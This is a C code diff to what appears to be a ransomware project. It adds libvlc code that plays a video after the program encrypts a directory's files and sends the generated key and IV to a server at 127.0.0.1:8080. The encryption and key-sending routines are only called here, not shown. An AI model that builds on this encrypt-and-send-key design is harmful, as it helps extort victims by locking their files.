@@ -3,9 +3,34 @@
 #include <sys/socket.h> // for socket
 #include <unistd.h> 
 #include <arpa/inet.h>
+#include <vlc/vlc.h>
 
 #define ip "127.0.0.1"
 #define port 8080
+
+//sudo apt-get install libvlc-dev || gcc my_program.c -lvlc -o my_program
+
+void vlc() 
+{
+	libvlc_instance_t *my_instance;
+
+	my_instance = libvlc_new(0, NULL);
+
+	libvlc_media_t *my_media_file;
+	my_media_file = libvlc_media_new_path(my_instance, "/home/kali/Bureau/Projet/Computer.mp4");
+	
+		// Create player
+	libvlc_media_player_t *my_player;
+	my_player = libvlc_media_player_new_from_media(my_media_file);
+
+	// Start playing
+	libvlc_media_player_play(my_player);
+	sleep(15); /* Wait for 15 seconds */
+	
+	libvlc_media_release(my_media_file);
+	libvlc_media_player_release(my_player);
+	libvlc_release(my_instance);
+}
 
 void usage()
 {
@@ -164,6 +189,7 @@ int main (int argc, char * argv[])
 			generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
 			send_key(pKey, pIv);
 			listdir(argv[1], iv, key, 'e');
+			vlc();
 			
 			free((char *)pKey);
 			free((char *)pIv);
